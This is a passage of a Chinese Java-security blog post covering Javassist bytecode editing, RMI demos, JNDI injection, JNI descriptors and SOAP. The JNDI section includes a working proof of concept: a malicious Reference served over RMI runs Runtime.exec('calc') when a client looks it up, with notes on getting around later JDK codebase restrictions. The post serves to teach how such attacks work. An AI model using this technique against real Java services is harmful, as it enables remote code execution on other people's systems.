<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 在方法体前插入代码块</span><br><span class="line">ctMethod.insertBefore(<span class="string">""</span>);</span><br><span class="line">// 在方法体后插入代码块</span><br><span class="line">ctMethod.insertAfter(<span class="string">""</span>);</span><br><span class="line">// 在某行 字节码 后插入代码块</span><br><span class="line">ctMethod.insertAt(10, <span class="string">""</span>);</span><br><span class="line">// 添加参数</span><br><span class="line">ctMethod.addParameter(CtClass);</span><br><span class="line">// 设置方法名</span><br><span class="line">ctMethod.setName(<span class="string">"newName"</span>);</span><br><span class="line">// 设置方法体</span><br><span class="line">ctMethod.setBody(<span class="string">"System.out.println(123);"</span>);</span><br></pre></td></tr></table></figure>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavassistDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 ClassPool 对象，使用系统默认类路径</span></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 创建一个空类</span></span><br><span class="line">        CtClass ctClass = classPool.makeClass(<span class="string">"Test"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新增 String 类型字段 name</span></span><br><span class="line">        CtField name = new CtField(classPool.get(String.class.getName()), "name", ctClass);</span><br><span class="line">        <span class="comment">// 新增 int 类型字段 age</span></span><br><span class="line">        CtField age = new CtField(classPool.get(int.class.getName()), "age", ctClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置修饰符 private</span></span><br><span class="line">        name.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        age.setModifiers(Modifier.PRIVATE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加到类里</span></span><br><span class="line">        ctClass.addField(name);</span><br><span class="line">        ctClass.addField(age);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 无参构造方法</span></span><br><span class="line">        CtConstructor ctConstructor = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;,ctClass);</span><br><span class="line">        <span class="comment">// 有参构造方法</span></span><br><span class="line">        CtConstructor ctConstructor1 = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;classPool.get(String<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()), <span class="title">CtClass</span>.<span class="title">intType</span>&#125;, <span class="title">ctClass</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方法体</span></span><br><span class="line">        ctConstructor.setBody(<span class="string">"&#123;name=\"test\";age=12;&#125;"</span>);</span><br><span class="line">        <span class="comment">// 方法体  $0 代表this  $1 $2 方法参数 name age</span></span><br><span class="line">        ctConstructor1.setBody(<span class="string">"&#123;$0.name = $1;$0.age = $2;&#125;"</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建 getter  setter 方法</span></span><br><span class="line">        CtMethod setName = CtNewMethod.setter(<span class="string">"setName"</span>, name);</span><br><span class="line">        CtMethod getName = CtNewMethod.getter(<span class="string">"getName"</span>, name);</span><br><span class="line"></span><br><span class="line">        CtMethod getAge = CtNewMethod.getter(<span class="string">"getAge"</span>, age);</span><br><span class="line">        CtMethod setAge = CtNewMethod.setter(<span class="string">"setAge"</span>, age);</span><br><span class="line"></span><br><span class="line">        ctClass.addMethod(setName);</span><br><span class="line">        ctClass.addMethod(getName);</span><br><span class="line"></span><br><span class="line">        ctClass.addMethod(getAge);</span><br><span class="line">        ctClass.addMethod(setAge);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//新增方法</span></span><br><span class="line">        CtMethod printName = <span class="keyword">new</span> CtMethod(<span class="keyword">new</span> CtClass(String<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()) </span>&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"printInfo"</span>, <span class="keyword">new</span> CtClass[]&#123;&#125;, ctClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置方法修饰符 public</span></span><br><span class="line">        printName.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        <span class="comment">// 设置方法体</span></span><br><span class="line">        printName.setBody(<span class="string">"&#123;return \"my name is \"+name+\",\" + \"age is \"+age;&#125;"</span>);</span><br><span class="line">        ctClass.addMethod(printName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入文件</span></span><br><span class="line">        ctClass.writeFile(<span class="string">"D:\\test"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将创建的ctClass加载至当前线程的上下文类加载器中</span></span><br><span class="line">        Class clz = ctClass.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射调用</span></span><br><span class="line">        Constructor declaredConstructor = clz.getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        Object obj = declaredConstructor.newInstance(<span class="string">"liangzi"</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        Method printInfo = clz.getMethod(<span class="string">"printInfo"</span>);</span><br><span class="line">        System.out.println(printInfo.invoke(obj));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JAVA-RMI"><a href="#JAVA-RMI" class="headerlink" title="JAVA RMI"></a>JAVA RMI</h1><p>详情可看<a href="https://mp.weixin.qq.com/s/bC71HoEtDAKKbHJvStu9qA" target="_blank" rel="noopener">JAVA RMI 反序列化知识详解</a>   </p>
<p>JAVA本身提供了一种RPC框架 RMI及Java 远程方法调用(Java Remote Method Invocation),可以在不同的Java 虚拟机之间进行对象间的通讯,RMI是基于JRMP协议(Java Remote Message Protocol Java远程消息交换协议)去实现的。    </p>
<p>RMI调用逻辑:<br><img src="../../images/java/serialize/1.png" alt=""></p>
<p>RMI主要分为三部分</p>
<ul>
<li>RMI Registry注册中心</li>
<li>Client 客户端</li>
<li>RMI Server服务端</li>
</ul>
<p>样例如下：   </p>
<p><strong>创建注册中心</strong><br>HelloRegistry.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloRegistry</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> <strong>RMI Server服务端</strong><br> 先创建一个继承java.rmi.Remote的接口<br> HelloInterface.java<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloInterface</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> 继承UnicastRemoteObject类,实现上面的接口<br> HelloImpl.java<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello from "</span> + from + <span class="string">"!!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"sayHello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> 写服务端的启动类,用于创建远程对象注册表和注册远程对象<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String rmiName=<span class="string">"ye1s"</span>;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(rmiName,<span class="keyword">new</span> HelloImpl());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException |  AlreadyBoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> 连接注册服务 查找ye1s对象</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(<span class="string">"ye1s"</span>);</span><br><span class="line">            System.out.println(hello.sayHello(<span class="string">"flag"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException | RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于Naming和LocateRegistry的理解可以从下面的文章了解<br><a href="https://blog.csdn.net/xinghun_4/article/details/45772175" target="_blank" rel="noopener">java.rmi.Naming和java.rmi.registry.LocateRegistry的区别</a></p>
<p><strong>攻击方式</strong><br><strong>服务端攻击注册中心</strong><br><strong>注册中心攻击客户端</strong><br><strong>客户端攻击注册中心</strong></p>
<h1 id="JAVA-JNDI注入"><a href="#JAVA-JNDI注入" class="headerlink" title="JAVA JNDI注入"></a>JAVA JNDI注入</h1><p>详情可看Java安全之JNDI注入:<a href="https://www.anquanke.com/post/id/201181" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201181</a> </p>
<p>JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p>
<p>这些命名/目录服务提供者:</p>
<ul>
<li>RMI (JAVA远程方法调用)</li>
<li>LDAP (轻量级目录访问协议)</li>
<li>CORBA (公共对象请求代理体系结构)</li>
<li>DNS (域名服务)</li>
<li>JNDI客户端调用方式 </li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//指定需要查找name名称</span><br><span class="line">String jndiName= <span class="string">"jndiName"</span>;</span><br><span class="line">//初始化默认环境</span><br><span class="line">Context context = new InitialContext();</span><br><span class="line">//查找该name的数据</span><br><span class="line">context.lookup(jndiName);</span><br></pre></td></tr></table></figure>

<p>这里的jndiName变量的值可以是上面的命名/目录服务列表里面的值,如果JNDI名称可控的话可能会被攻击。</p>
<p>服务端代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"test"</span>, <span class="string">"test"</span>, <span class="string">"http://localhost/"</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"calc"</span>, wrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恶意代码（test.class），将其编译好放到可访问的http服务器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当客户端通过InitialContext().lookup(“rmi://127.0.0.1:7777/calc”)获取远程对象时，会执行我们的恶意代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI_Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//jdk1.8.121之后需要添加System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true")</span></span><br><span class="line">        <span class="keyword">new</span> InitialContext().lookup(<span class="string">"rmi://127.0.0.1:7777/calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="JDK-lt-8u191"><a href="#JDK-lt-8u191" class="headerlink" title="JDK &lt; 8u191"></a>JDK &lt; 8u191</h2><p>我们在上面讲了在JDK 6u132, JDK 7u122, JDK 8u113中Java限制了通过RMI远程加载Reference工厂类，com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。</p>
<p>但是需要注意的是JNDI不仅可以从通过RMI加载远程的Reference工厂类，也可以通过LDAP协议加载远程的Reference工厂类，但是在之后的版本Java也对LDAP Reference远程加载Factory类进行了限制，在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的值默认为false，对应的CVE编号为：CVE-2018-3149</p>
<h2 id="JDK-gt-8u191"><a href="#JDK-gt-8u191" class="headerlink" title="JDK &gt;8u191"></a>JDK &gt;8u191</h2><p>在jdk8u191之后RMI和LDAP默认都不能从远程加载类,还是可以在RMI和LDAP中获取对象。在前面我们分析过javax.naming.spi.NamingManager#getObjectFactoryFromReference方法,会先从本地的CLASSPATH中寻找该类,如果没有才会去远程加载。之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法。那么只需要在攻击者本地CLASSPATH找到这个Reference Factory类并且在这四个地方其中一块能执行payload就可以了 </p>
<h1 id="JNI字段描述符"><a href="#JNI字段描述符" class="headerlink" title="JNI字段描述符"></a>JNI字段描述符</h1><p>JNI 字段描述符【Java Native Interface FieldDescriptors】，它是一种对 Java 数据类型、数组、方法的编码   </p>
<p>基本概念<br>这种编码方式把 Java 中的基本数据类型、数组、对象都使用一种规范来表示：</p>
<ul>
<li>八种基本数据类型都使用一个大写字母表示</li>
<li>void 使用 V 表示</li>
<li>数组使用左方括号表示</li>
<li>方法使用一组圆括号表示，参数在括号里，返回类型在括号右侧</li>
<li>对象使用 L 开头，分号结束，中间是类的完整路径，包名使用正斜杠分隔</li>
</ul>
<p>基本编码<br>基本编码如下表格，并配有解释说明： </p>
<p><img src="../../images/java/serialize/2.jpg" alt=""></p>
<p>举例说明<br>数据类型<br>1、<code>[I：</code>表示 int 一维数组，即<code>int []</code>。<br>2、<code>Ljava/lang/String;：</code>表示 String 类型，即 java.lang.String。<br>3、<code>[Ljava/lang/Object;：</code>表示 Object 一维数组，即 <code>java.lang.Object []</code>。<br>4、Z：表示 boolean 类型。<br>5、V：表示 void 类型。  </p>
<p>方法<br>1、() V：表示参数列表为空，返回类型为 void 的方法，即 void func ()。<br>2、(II) V：表示参数列表为 int、int，返回类型为 void 的方法，即 void func (int i,int j)。<br>3、(Ljava/lang/String;Ljava/lang/String;) I：表示参数列表为 String、String，返回类型为 int 的方法，  即 int func (String i,String j)。<br>4、<code>([B) V</code>：表示参数列表为<code>byte []</code>，返回类型为 void 的方法，即 <code>void func (byte [] bytes)</code>。<br>5、(ILjava/lang/Class;) J：表示参数列表为 int、Class，返回类型为 long 的方法，即 long func (int i,Class c)。  </p>
<h1 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h1><p>SOAP 是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换。</p>
<p>或者更简单地说：SOAP 是用于访问网络服务的协议。<br><a href="https://www.runoob.com/soap/soap-intro.html" target="_blank" rel="noopener">SOAP菜鸟教程</a></p>
<p>参考文章:<br><a href="https://xz.aliyun.com/t/6787" target="_blank" rel="noopener">Java反序列化漏洞原理解析</a><br><a href="https://xz.aliyun.com/t/136" target="_blank" rel="noopener">Java反序列化漏洞分析</a><br><a href="https://javasec.org/" target="_blank" rel="noopener">攻击Java Web应用-Java Web安全</a><br><a href="https://mp.weixin.qq.com/s/bC71HoEtDAKKbHJvStu9qA" target="_blank" rel="noopener">JAVA RMI 反序列化知识详解</a><br><a href="https://blog.csdn.net/xinghun_4/article/details/45772175" target="_blank" rel="noopener">java.rmi.Naming和java.rmi.registry.LocateRegistry的区别</a><br><a href="https://xz.aliyun.com/t/7031" target="_blank" rel="noopener">JAVA反序列化 - Commons-Collections组件</a><br><a href="https://xz.aliyun.com/t/6493" target="_blank" rel="noopener">Java反序列化入门-Shiro RememberMe 1.2.4远程代码执行漏洞-详细分析</a><br>老大难的 Java ClassLoader 再不理解就老了: <a href="https://zhuanlan.zhihu.com/p/51374915" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/51374915</a></p>
<p>JAVA JNDI注入知识详解:<a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/9d8837ef.html">https://blog.cfyqy.com/article/9d8837ef.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/6d9c4fd7.html"><i class="fas fa-angle-left">&nbsp;</i><span>SQLi-LABS Page-2 (Adv Injections)</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/a1ebb960.html"><span>ATT&amp;CK _Initial_Access</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) 